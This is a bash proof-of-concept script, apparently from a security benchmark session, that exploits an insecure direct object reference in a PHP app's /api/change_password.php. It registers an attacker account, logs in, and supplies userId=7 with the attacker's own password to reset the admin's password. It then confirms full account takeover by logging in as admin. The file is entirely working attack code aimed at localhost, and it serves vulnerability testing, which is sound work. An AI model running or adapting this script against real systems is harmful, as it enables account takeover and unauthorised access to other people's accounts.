#!/bin/bash
# POC: IDOR privilege escalation in /api/change_password.php allowing complete account takeover by changing any user's password
# Target: ./repo
# Created: 2025-12-01T16:00:30.168Z
# Session: benchmark-XBEN-069-24-minbd4jr

# IDOR Privilege Escalation POC - /api/change_password.php
# Demonstrates critical vulnerability where attacker can change any user's password
# by providing their own valid password as oldPassword verification

TARGET_URL="http://localhost:8080"
COOKIES_FILE="/tmp/idor_cookies.txt"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}=== IDOR Privilege Escalation POC ===${NC}"
echo -e "${YELLOW}Target: $TARGET_URL/api/change_password.php${NC}"
echo ""

# Step 1: Register attacker account
echo -e "${YELLOW}[*] Step 1: Registering attacker account...${NC}"
ATTACKER_USERNAME="idor_attacker_$(date +%s)"
ATTACKER_EMAIL="$ATTACKER_USERNAME@test.local"
ATTACKER_PASSWORD="AttackerPass123"

REGISTER_RESPONSE=$(curl -s -X POST "$TARGET_URL/api/register.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$ATTACKER_USERNAME&email=$ATTACKER_EMAIL&password=$ATTACKER_PASSWORD")

echo "Registration Response: $REGISTER_RESPONSE"

if echo "$REGISTER_RESPONSE" | grep -q "successful"; then
  echo -e "${GREEN}[+] Attacker account registered successfully${NC}"
else
  echo -e "${RED}[-] Registration failed${NC}"
  exit 1
fi

echo ""

# Step 2: Login as attacker
echo -e "${YELLOW}[*] Step 2: Logging in as attacker...${NC}"

LOGIN_RESPONSE=$(curl -s -X POST "$TARGET_URL/api/login.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -c "$COOKIES_FILE" \
  -d "username=$ATTACKER_USERNAME&password=$ATTACKER_PASSWORD")

echo "Login Response: $LOGIN_RESPONSE"

if echo "$LOGIN_RESPONSE" | grep -q "successful"; then
  echo -e "${GREEN}[+] Attacker logged in successfully${NC}"
else
  echo -e "${RED}[-] Login failed${NC}"
  exit 1
fi

echo ""

# Step 3: Exploit IDOR to change admin password (user ID 7)
echo -e "${YELLOW}[*] Step 3: Exploiting IDOR to change admin (user ID 7) password...${NC}"
echo -e "${YELLOW}    Sending attacker's password as oldPassword verification${NC}"
echo -e "${YELLOW}    But requesting password change for userId=7 (admin)${NC}"

TARGET_USER_ID="7"
NEW_ADMIN_PASSWORD="ADMIN_IDOR_HACKED_$(date +%s)"

EXPLOIT_RESPONSE=$(curl -s -X POST "$TARGET_URL/api/change_password.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "$COOKIES_FILE" \
  -d "userId=$TARGET_USER_ID&oldPassword=$ATTACKER_PASSWORD&newPassword=$NEW_ADMIN_PASSWORD&confirmPassword=$NEW_ADMIN_PASSWORD")

echo "Exploit Response: $EXPLOIT_RESPONSE"

if echo "$EXPLOIT_RESPONSE" | grep -q "successful"; then
  echo -e "${GREEN}[+] IDOR Exploitation Successful! Admin password changed!${NC}"
else
  echo -e "${RED}[-] IDOR exploitation failed${NC}"
  echo -e "${RED}[-] This might indicate the vulnerability is already patched${NC}"
  exit 1
fi

echo ""

# Step 4: Verify admin account compromise
echo -e "${YELLOW}[*] Step 4: Verifying admin account compromise...${NC}"
echo -e "${YELLOW}    Attempting to login as admin with new password...${NC}"

ADMIN_LOGIN_RESPONSE=$(curl -s -X POST "$TARGET_URL/api/login.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=$NEW_ADMIN_PASSWORD")

echo "Admin Login Response: $ADMIN_LOGIN_RESPONSE"

if echo "$ADMIN_LOGIN_RESPONSE" | grep -q "successful"; then
  echo -e "${GREEN}[+] ACCOUNT TAKEOVER CONFIRMED! Successfully logged in as admin!${NC}"
  echo -e "${RED}[!] CRITICAL: Attacker has complete control of admin account${NC}"
else
  echo -e "${RED}[-] Could not login with new admin password${NC}"
  exit 1
fi

echo ""
echo -e "${RED}=== VULNERABILITY CONFIRMED ===${NC}"
echo -e "${RED}[!] Critical IDOR vulnerability allows privilege escalation${NC}"
echo -e "${RED}[!] Any authenticated user can take over any other account${NC}"
echo -e "${GREEN}[+] POC completed successfully${NC}"

# Cleanup
rm -f "$COOKIES_FILE"

exit 0